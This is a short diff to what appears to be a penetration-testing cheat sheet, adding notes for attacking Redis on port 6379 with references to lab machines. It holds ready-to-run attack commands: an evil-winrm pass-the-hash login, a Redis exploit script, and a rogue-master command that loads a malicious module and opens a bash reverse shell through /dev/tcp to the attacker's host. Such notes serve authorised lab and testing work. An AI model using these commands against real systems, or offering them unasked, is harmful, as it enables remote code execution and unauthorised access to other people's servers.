@@ -758,9 +758,15 @@ evil-winrm -i 10.11.1.111 -u Administrator -H 'hash-pass' -s /scripts/folder
 
 ## Redis - 6379
 
+Ref: Sybaris, Wombo
+
 ```
 https://github.com/Avinash-acid/Redis-Server-Exploit
 python redis.py 10.10.10.160 redis
+
+https://github.com/vulhub/redis-rogue-getshell.git
+sudo python3 redis-master.py -r 192.168.89.69 -L 192.168.49.89 -P 80 -f RedisModulesSDK/exp.so -c "bash -c 'bash -i >& /dev/tcp/192.168.49.89/8080 0>&1'"
+
 ```
 
 ## MsDeploy - 8172
